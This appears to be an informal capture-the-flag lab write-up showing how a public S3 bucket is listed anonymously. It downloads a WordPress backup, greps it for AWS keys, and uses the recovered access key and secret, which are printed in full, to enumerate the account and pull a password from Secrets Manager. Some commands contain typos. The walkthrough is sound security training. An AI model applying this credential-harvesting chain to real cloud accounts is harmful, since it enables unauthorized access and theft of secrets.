# s3 bucket aws attacks 

1. u get an img  [https://s3.amazonaws.com/images.bestfestivalcompany.com/flyer.png]

2. https://s3.amazonaws.com/images.bestfestivalcompany.com 
- intersting 
```xml
<Key>flag.txt</Key>
<LastModified>2021-11-13T15:06:51.000Z</LastModified>
<ETag>"6f612c089ef7289bade62611b99ecbdf"</ETag>
<Size>68</Size>
<StorageClass>STANDARD</StorageClass>
``` 


3. https://s3.amazonaws.com/images.bestfestivalcompany.com/flag.txt 

```
It's easy to get your elves data when you leave it so easy to find!
```

4. using aws cli 
```bash
aws s3 ls s3://images.bestfestivalcompany.com  --no-sign-request
```

result 
```language
2021-11-13 15:06:51       6148 .DS_Store
2021-11-13 12:43:03     108420 0vF39p3.png
2021-11-27 11:55:21     705191 AWSConsole.png
2021-11-13 12:43:03       5652 aws-logo.png
2021-11-13 15:06:51         68 flag.txt
2021-11-13 15:06:51    2349068 flyer.png
2021-11-13 12:43:03      92531 presents.jpg
2021-11-13 12:43:03       4680 tree.png
2021-11-23 23:52:22   16556739 wp-backup.zip
```

Download it 
```bash
aws s3 cp s3://images.bestfestivalcompany.com/wp-backup.zip . --no-sign-request
```

5. What is the AWS Access Key ID in that file?
```bash
grep -R AKIA #from the hint 	
grep -R SECRET # from the AWS IAM presentation we will need it to fill config
```
Result 
```bash
wp-config.php:define('S3_UPLOADS_KEY', 'AKIAQI52OJVCPZXFYAOI');
wp-config.php:define('S3_UPLOADS_SECRET', 'Y+2fQBoJ+X9N0GzT4dF5kWE0ZX03n/KcYxkS1Qmc');
#wp-config-sample.php:define('S3_UPLOADS_SECRET', 'AOCSECRETKEY'); 
```

6. What is the AWS Account ID that access-key works for?
Crea
```bash
aws configure --profile hr #create a profile name hr
```
input 
```bash
AWS Access Key ID [None]: AKIAQI52OJVCPZXFYAOI
AWS Secret Access Key [None]: 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
Default region name [None]:us-east-1 #u will need it in instances
Default output format [None]: #none 
```

Get the acc id 
```bash
aws sts get-access-key-info --access-key-id AKIAQI52OJVCPZXFYAOI --profile hr
```
Result 
```json
{
    "Account": "019181489476"
}
```

7. What is the Username for that access-key?

>Determining the Username the access key you're using belongs to
>aws sts get-caller-identity --profile PROFILENAME

```bash
aws sts get-caller-identity --profile hr
```

Result 
```bash
{
    "UserId": "AIDAQI52OJVCFHT3E73BO",
    "Account": "019181489476",
    "Arn": "arn:aws:iam::019181489476:user/ElfMcHR@bfc.com"
}
```
answer : **ElfMcHR@bfc.com**

8. There is an EC2 Instance in this account. Under the TAGs, what is the Name of the instance?

>Listing all the EC2 instances running in an account
>aws ec2 describe-instances --output text --profile PROFILENAME

```bash
aws ec2 describe-instances --output text --profile hr
```
Result of tags 
```bash
STATEREASON     Client.UserInitiatedShutdown    Client.UserInitiatedShutdown: User initiated shutdown
TAGS    aws:cloudformation:stack-id     arn:aws:cloudformation:us-east-1:019181489476:stack/HR-Portal/5ebc4e90-447e-11ec-a711-12d63f44d7b7
TAGS    aws:cloudformation:logical-id   Instance
TAGS    created_by      Elf McHR
TAGS    aws:cloudformation:stack-name   HR-Portal
TAGS    Name    HR-Portal
```

9. What is the database password stored in Secrets Manager?

> aws secretsmanager help < in hints 
> aws secretsmanager list-secrets

```bash
aws secretsmanager list-secrets --profile test
```
Result 
```json
{
    "SecretList": [
        {
            "ARN": "arn:aws:secretsmanager:us-east-1:019181489476:secret:HR-Password-8AkWYF",
            "Name": "HR-Password",
            "Description": "Portal DB Secret",
            "LastChangedDate": 1637717347.812,
            "LastAccessedDate": 1639699200.0,
            "Tags": [
                {
                    "Key": "aws:cloudformation:stack-name",
                    "Value": "HR-Portal"
                },
                {
                    "Key": "aws:cloudformation:logical-id",
                    "Value": "FalseSecret"
                },
                {
                    "Key": "aws:cloudformation:stack-id",
                    "Value": "arn:aws:cloudformation:us-east-1:019181489476:stack/HR-Portal/5ebc4e90-447e-11ec-a711-12d63f44d7b7"
                },
                {
                    "Key": "created_by",
                    "Value": "Elf McHR"
                },
                {
                    "Key": "Name",
                    "Value": "Payroll"
                }
            ],
            "SecretVersionsToStages": {
                "70630b3c-4fbe-4a24-885d-18445bd808b1": [
                    "AWSCURRENT"
                ],
                "a702190e-69f7-4a8a-81fd-3d20b486657a": [
                    "AWSPREVIOUS"
                ]
            },
            "CreatedDate": 1636807016.521
        }
    ]
}
```

secret name **HR-Password**

```bash
aws secretsmanager get-secret-value --secret-id HR-Password --profile test
```
resul 
```bash
{
    "ARN": "arn:aws:secretsmanager:us-east-1:019181489476:secret:HR-Password-8AkWYF",
    "Name": "HR-Password",
    "VersionId": "70630b3c-4fbe-4a24-885d-18445bd808b1",
    "SecretString": "The Secret you're looking for is not in this **REGION**. Santa wants to have low latency to his databases. Look closer to where he lives.", # we gotta change our REGION in config i guess 
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": 1637717347.718
}
```
 

```bash
aws secretsmanager get-secret-value --secret-id HR-Password --profile test --regien eu-noth-1 
```
result 
```bash
"ARN": "arn:aws:secretsmanager:eu-north-1:019181489476:secret:HR-Password-8AkWYF",
    "Name": "HR-Password",
    "VersionId": "70630b3c-4fbe-4a24-885d-18445bd808b1",
    "SecretString": "winterr2021!", # answer 
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": 162712327.712
}
```
and u get the password **winterr2021!**